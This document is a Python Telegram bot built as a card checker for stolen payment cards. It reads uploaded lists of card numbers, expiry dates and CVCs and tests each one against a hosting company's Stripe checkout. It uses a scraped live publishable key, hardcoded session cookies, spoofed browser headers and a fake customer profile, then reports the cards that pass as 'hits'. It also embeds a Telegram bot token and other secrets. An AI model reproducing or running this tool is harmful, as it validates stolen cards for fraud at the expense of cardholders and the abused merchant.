import requests
import telebot
from telebot import types
from user_agent import generate_user_agent

token = "6442412919:AAHg0ep2wEeoREvksqRVJx9VlegfjwFURL8"
bot = telebot.TeleBot(token, parse_mode="HTML")

def Tele(n, mm, yy, cvc):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1bb33ec9-e173-4541-8c2f-1e57d7515e5af74706&muid=980b8ebc-54ed-4460-83da-3e13fc8212fb7afe7c&sid=1e7b4309-c3c3-456e-9a64-cd10ed799bd8f9b874&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=50765&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    idi = response.json().get('id', '')

    cookies = {
        'WHMCSy551iLvnhYt7': '2819ac57d0acd6a21dd79afa8628e326',
        '_fbp': 'fb.1.1703722099248.647355406',
        'cf_clearance': 'sPhRXBUh3EadWwRq_N5Sijc97eg79QmYOZm6r0IMA9w-1703722099-0-2-b44ed718.8d6198a.1f999ccb-0.2.1703722099',
        '__zlcmid': '1JXmNUtSazCXCpJ',
        '__stripe_mid': '980b8ebc-54ed-4460-83da-3e13fc8212fb7afe7c',
        '__stripe_sid': '1e7b4309-c3c3-456e-9a64-cd10ed799bd8f9b874',
    }

    headers = {
        'authority': 'my.hostarmada.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my.hostarmada.com',
        'referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': generate_user_agent(),
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'token': '52da1734817fbae0b1d7d78c64bd03696c0e529e',
        'submit': 'true',
        'custtype': 'new',
        'loginemail': '',
        'loginpassword': '',
        'firstname': 'mofg',
        'lastname': 'txujbvhj',
        'email': 'top574837@gmail.com',
        'country-calling-code-phonenumber': [
            '20',
            '',
        ],
        'phonenumber': '69 9539321',
        'companyname': 'mazen6564',
        'address1': 'العدوه',
        'address2': '',
        'city': 'المنيا',
        'state': 'Cairo',
        'postcode': '46346',
        'country': 'EG',
        'contact': '',
        'domaincontactfirstname': '',
        'domaincontactlastname': '',
        'domaincontactemail': '',
        'country-calling-code-domaincontactphonenumber': '20',
        'domaincontactphonenumber': '',
        'domaincontactcompanyname': '',
        'domaincontactaddress1': '',
        'domaincontactaddress2': '',
        'domaincontactcity': '',
        'domaincontactstate': '',
        'domaincontactpostcode': '',
        'domaincontactcountry': 'US',
        'domaincontacttax_id': '',
        'password': 'WPDzCBNg9GCLxCn',
        'password2': 'WPDzCBNg9GCLxCn',
        'paymentmethod': 'stripe',
        'ccinfo': 'new',
        'ccdescription': '',
        'marketingoptin': '1',
        'accepttos': 'on',
        'payment_method_id': idi,
    }

    response = requests.post(
        'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    try:
        respones = response.json()
        print(respones)
    except Exception as e:
        print(f"Non-JSON response: {response.text}")

    return response

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now \n ارسل الملف الان")

@bot.message_handler(content_types=["document"])
def main(message):
    hits = 0
    bad = 0
    ko = bot.reply_to(message, "Checking Your Email...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", 'r') as f:
            lines = f.readlines()
            total = len(lines)
            for line in lines:
                n, mm, yy, cvc = line.strip().split('|')
                if int(yy) == 20:
                    continue

                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• Hits ✅ : [{hits}] •", callback_data='x')
                cm2 = types.InlineKeyboardButton(f"• Bad ❌ : [ {bad} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• المجموع : [ {total} ] •", callback_data='x')
                mes.add(cm1, cm2, cm5)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''يتم الفحص بواسطة بوت BY ➜ @maho_s9 ''', reply_markup=mes)

                try:
                    last = str(Tele(n, mm, yy, cvc))
                except Exception as e:
                    print(e)
                    last = "Your card was declined."

                if any(keyword in last for keyword in ["Declined - Call Issuer", "Declinedll Issuer", "Your purchase was declined", "Your card has expired", "risk_threshold", "Error Processing Payment"]):
                    bad += 1
                    msg2 = f'''
━━━━━━━━━━━━━━━━━
Strip >> {line.strip()}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @maho_s9
◆ ⛔ '''
                    print(msg2)
                elif any(keyword in last for keyword in ["live", "success", "Your card has insufficient funds"]):
                    hits += 1
                    msg = f'''
━━━━━━━━━━━━━━━━━
Strip >> {line.strip()}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @maho_s9
◆ ✅ '''
                    print(msg)
                    bot.reply_to(message, msg)
                else:
                    bad += 1
                    print(f'❌ banned ==> {line.strip()}')

    except Exception as e:
        print(f"An error occurred: {e}")

print("تم تشغيل البوت")
bot.polling()

